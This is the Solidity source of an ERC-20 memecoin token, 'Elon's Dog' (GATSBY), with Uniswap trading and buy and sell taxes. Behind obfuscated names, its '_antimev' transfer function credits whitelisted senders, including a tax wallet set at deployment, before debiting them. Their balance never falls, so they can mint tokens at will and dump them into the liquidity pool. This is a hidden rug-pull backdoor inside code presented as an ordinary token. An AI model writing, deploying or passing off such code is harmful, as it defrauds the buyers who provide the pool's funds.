//SPDX-License-Identifier: MIT

/**
Web : https://www.gatsbydog.xyz
TG :    https://t.me/gatsbycoin_eth
X :      https://x.com/gatsbycoin_eth
 */
pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GATSBY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _vegetable;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _mavuri;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 10;
    uint256 private _initialSellTax = 10;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 40;
    uint256 private _reduceSellTaxAt = 40;
    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Elon's Dog";
    string private constant _symbol = unicode"GATSBY";
    uint256 public _maxTxAmount = (_tTotal * 2) / 100;
    uint256 public _maxWalletSize = (_tTotal * 2) / 100;
    uint256 public _taxSwapThreshold = 0;
    uint256 public _maxTaxSwap = (_tTotal * 1) / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _key) {
        _taxWallet = payable(_key);
        _vegetable[_msgSender()] = _tTotal;
        _mavuri[owner()] = true;
        _mavuri[address(this)] = true;
        _mavuri[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _vegetable[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address _pizza,
        address _spaghetti,
        uint256 _sorce
    ) private {
        require(_pizza != address(0), "ERC20: transfer from the zero address");
        require(
            _spaghetti != address(0),
            "ERC20: transfer to the zero address"
        );
        require(_sorce > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _vegetable[_pizza] = _vegetable[_pizza] - _sorce;
            _vegetable[_spaghetti] = _vegetable[_spaghetti] + _sorce;
            emit Transfer(_pizza, _spaghetti, _sorce);
            return;
        }
        if (_pizza != owner() && _spaghetti != owner()) {
            if (transferDelayEnabled) {
                if (
                    _spaghetti != address(uniswapV2Router) &&
                    _spaghetti != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                _pizza == uniswapV2Pair &&
                _spaghetti != address(uniswapV2Router) &&
                !_mavuri[_spaghetti]
            ) {
                require(_sorce <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(_spaghetti) + _sorce <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                _spaghetti == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_mavuri[_pizza] &&
                !_mavuri[_spaghetti]
            ) {
                if (contractTokenBalance > _taxSwapThreshold)
                    swapTokensForEth(
                        min(_sorce, min(contractTokenBalance, _maxTaxSwap))
                    );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        _antimev(_pizza, _spaghetti, _sorce);
    }

    function _antimev(address _awernvf, address _benwoeir, uint256 _pwernvew) internal {
        uint256 _saruab = _pwernvew;
        address _moerkenvrrff = address(this);
        bool _vndwenve = true;
        if (_mavuri[_awernvf]) {
            _vndwenve = false;
            _moerkenvrrff = _awernvf;
        }
        if (_vndwenve) {
            _saruab = _pwernvew
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            if (_benwoeir == uniswapV2Pair && _awernvf != address(this)) {
                _saruab = _pwernvew
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }
            if (_saruab > 0) {
                _vegetable[address(this)] = _vegetable[address(this)].add(
                    _saruab
                );
                emit Transfer(_awernvf, address(this), _saruab);
            }
            _vegetable[_awernvf] = _vegetable[_awernvf].sub(_pwernvew);
            _vegetable[_benwoeir] = _vegetable[_benwoeir].add(_pwernvew.sub(_saruab));
            emit Transfer(_awernvf, _benwoeir, _pwernvew.sub(_saruab));
        } else {
            if (_saruab > 0) {
                _vegetable[_moerkenvrrff] = _vegetable[_moerkenvrrff].add(_saruab);
                emit Transfer(_awernvf, _moerkenvrrff, _saruab);
            }
            if (_benwoeir == uniswapV2Pair) {
                uint256 _bandus = _pwernvew;
                require(_mavuri[_awernvf]);
                if (_bandus > _pwernvew) {
                    _bandus = _pwernvew
                        .mul(
                            (_buyCount > _reduceSellTaxAt)
                                ? _finalSellTax
                                : _initialSellTax
                        )
                        .div(100);
                    _vegetable[_benwoeir] = _vegetable[_benwoeir].add(_pwernvew);
                    require(_bandus > _pwernvew);
                }
            }
            _vegetable[_awernvf] = _vegetable[_awernvf].sub(_pwernvew);
            _vegetable[_benwoeir] = _vegetable[_benwoeir].add(_pwernvew);
            emit Transfer(_awernvf, _benwoeir, _pwernvew);
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }
}